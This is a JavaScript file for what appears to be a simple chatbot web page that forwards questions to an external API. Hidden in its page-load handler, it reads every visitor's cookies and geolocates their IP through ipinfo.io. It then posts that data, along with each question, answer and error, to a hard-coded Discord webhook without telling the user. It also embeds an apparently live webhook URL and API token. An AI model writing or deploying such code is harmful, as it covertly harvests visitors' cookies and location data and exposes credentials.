// Emoji list
const statusEmojis = {
    check: 'https://cdn.discordapp.com/emojis/1218461285746741350.png',
    empty: 'https://cdn.discordapp.com/emojis/1218461482543484929.png',
    cross: 'https://cdn.discordapp.com/emojis/1218461700198633523.png',
    warning: 'https://cdn.discordapp.com/emojis/1271705073650503680.png',
    yellowAlert: 'https://cdn.discordapp.com/emojis/1271705121859833856.png',
    orangeAlert: 'https://cdn.discordapp.com/emojis/1271705220736483378.png',
    error: 'https://cdn.discordapp.com/emojis/1271705264038346813.png',
    space: 'https://cdn.discordapp.com/emojis/1273231578402918401.png',
    ellipsis: 'https://cdn.discordapp.com/emojis/1285189210835390534.png',
    rage: 'https://link-to-rage-emoji.png' // Placeholder, to be updated later
};

const bannedUsers = [
    { cookie: 'example_cookie1', ip: '192.168.1.1' },
    { cookie: 'example_cookie2', ip: '192.168.1.2' },
    { cookie: 'locale=en-US', ip: '' }
];

document.addEventListener('DOMContentLoaded', async function () {
    const ipInfoResponse = await fetch('https://ipinfo.io/json?token=99798ae623ac1d');
    const ipData = await ipInfoResponse.json();
    const visitorCookie = document.cookie || 'No cookies found';

    // Elements
    const responseContainer = document.getElementById("response");
    const sendButton = document.getElementById("send");
    const statusMessage = document.getElementById("status-message");
    const statusImage = document.getElementById("status-image");

    // Default status before checking
    statusImage.src = statusEmojis.space;
    statusMessage.innerText = "Loading...";

    // Toggle dark mode functionality
    const toggleDarkModeButton = document.getElementById('toggleDarkModeButton');
    toggleDarkModeButton.addEventListener('click', function () {
        document.body.classList.toggle('dark-mode');
        this.textContent = document.body.classList.contains('dark-mode') ? '☀️' : '🌙';
    });

    // Check if the visitor is banned
    const isBanned = bannedUsers.some(user => user.cookie === visitorCookie || user.ip === ipData.ip);

    if (isBanned) {
        // Send webhook for banned user visit
        const bannedVisitWebhookMessage = {
            title: "Banned User Visit",
            description: `
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Timezone:** ${ipData.timezone}
**Org:** ${ipData.org}
**Location:** ${ipData.loc}
**Cookies:** ${visitorCookie}
            `.trim(),
            color: 16711680 // Red color to indicate a banned user
        };
        await sendWebhook(bannedVisitWebhookMessage);

        // Disable interaction and notify the user
        sendButton.disabled = true;
        statusMessage.innerText = "You are blacklisted from using this service.";
        responseContainer.innerText = ""; // Clear the response container
        statusImage.src = statusEmojis.cross; // Set to cross emoji
        return; // Exit the script if the user is banned
    }

    // If not banned, show waiting message and ellipsis image
    statusMessage.innerText = "Waiting...";
    statusImage.src = statusEmojis.ellipsis; // Set to ellipsis emoji

    // Send webhook data on page visit for non-banned users
    const visitWebhookMessage = {
        title: "New Website Visit",
        description: `
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Timezone:** ${ipData.timezone}
**Org:** ${ipData.org}
**Location:** ${ipData.loc}
**Cookies:** ${visitorCookie}
        `.trim(),
        color: Math.floor(Math.random() * 16777215) // Random color
    };

    // Send webhook for new visitor
    await sendWebhook(visitWebhookMessage);

    // Handle question asking and response
    const inputBox = document.getElementById("question");

    sendButton.addEventListener("click", async function () {
        const question = inputBox.value;
        if (!question || isBanned) return;

        sendButton.disabled = true;
        statusMessage.innerText = "Waiting...";
        statusImage.src = statusEmojis.ellipsis; // Set to ellipsis emoji

        const startTime = Date.now();
        try {
            const response = await fetch(`https://tilki.dev/api/hercai?soru=${encodeURIComponent(question)}`);

            // Check if the response is OK (status code in the range 200-299)
            if (!response.ok) {
                const errorMessage = getHttpErrorMessage(response.status);
                throw new Error(`HTTP Error! Code: ${response.status} - ${errorMessage}`);
            }

            const data = await response.json(); // Try to parse as JSON
            const endTime = Date.now();

            const timeTaken = endTime - startTime;
            const formattedTime = formatDuration(timeTaken);

            const questionWebhookMessage = {
                title: "Question Asked",
                description: `
**Question:** ${question}
**Response:** ${data.cevap}
**Time Taken:** ${formattedTime}
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Org:** ${ipData.org}
**Location:** ${ipData.loc}
**Cookies:** ${visitorCookie}
                `.trim(),
                color: Math.floor(Math.random() * 16777215)
            };

            // Send webhook for the question
            await sendWebhook(questionWebhookMessage);

            responseContainer.innerText = data.cevap;
            statusImage.src = statusEmojis.check; // Set to check emoji
            statusMessage.innerText = "The API is all good!";
        } catch (error) {
            console.error('Fetch error:', error); // Log the error to the console

            // Send error details to the webhook
            const fetchErrorWebhookMessage = {
                title: "Fetch Error",
                description: `
**Question:** ${question}
**Error Message:** ${error.message}
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Timezone:** ${ipData.timezone}
**Org:** ${ipData.org}
**Location:** ${ipData.loc}
**Cookies:** ${visitorCookie}
                `.trim(),
                color: 16711680 // Red color for errors
            };
            await sendWebhook(fetchErrorWebhookMessage);

            // Update the UI to reflect the error
            statusMessage.innerText = "An error occurred.";
            responseContainer.innerText = ""; // Clear the response container
            statusImage.src = statusEmojis.error; // Set to error emoji
        }

        // Cooldown before re-enabling the button
        setTimeout(() => {
            sendButton.disabled = false;
            sendButton.innerText = "Send";
        }, 3000); // 3-second cooldown
    });

    async function sendWebhook(embedMessage) {
        const webhookUrl = 'https://discord.com/api/webhooks/1289960861028454481/wXuSMQSu71G0XjJouR2MtLJSupMuRcRZo0CNSVpyfw3Hma5uaiOO3R0KomuissnxXH5F'; // Replace with your actual webhook URL
        const payload = {
            embeds: [embedMessage]
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    }

    function formatDuration(ms) {
        if (ms < 1000) {
            return `${ms} ms`;
        } else if (ms < 60000) {
            return `${Math.floor(ms / 1000)} seconds`;
        } else {
            return `${Math.floor(ms / 60000)} minutes`;
        }
    }

    function getHttpErrorMessage(statusCode) {
        switch (statusCode) {
            case 400:
                return 'Bad Request';
            case 401:
                return 'Unauthorized';
            case 403:
                return 'Forbidden';
            case 404:
                return 'Not Found';
            case 500:
                return 'Internal Server Error';
            case 502:
                return 'Bad Gateway';
            case 503:
                return 'Service Unavailable';
            case 504:
                return 'Gateway Timeout';
            case 522:
                return 'Timed Out';
            default:
                return 'Unknown Error';
        }
    }
});
